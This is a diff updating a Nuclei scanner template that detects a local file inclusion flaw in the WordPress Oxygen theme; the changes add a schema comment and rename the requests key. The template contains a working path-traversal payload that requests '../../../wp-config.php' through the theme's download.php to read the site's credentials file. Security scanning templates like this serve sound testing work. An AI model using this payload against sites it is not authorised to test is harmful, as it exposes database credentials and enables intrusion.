@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-oxygen-theme-lfi
 info:
   name: WordPress Oxygen-Theme Themes LFI
@@ -5,7 +6,7 @@ info:
   severity: high
   tags: wordpress,wp-theme,lfi,wp
   reference: https://cxsecurity.com/issue/WLB-2019030178
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php'
